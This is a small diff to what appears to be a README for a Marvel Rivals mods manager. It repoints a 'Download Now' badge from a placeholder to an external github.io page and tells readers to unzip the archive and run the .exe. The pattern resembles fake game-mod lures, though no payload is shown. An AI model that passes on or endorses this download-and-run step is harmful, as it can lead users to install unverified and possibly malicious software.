@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://marvel-rivals-mods-manager.github.io/.github/)
 
 ## 📸 Overview
 ![marvel-rivals-mods-dashboard](https://github.com/user-attachments/assets/b28072bd-03dc-4de7-a706-7e8e3da7bd9f)
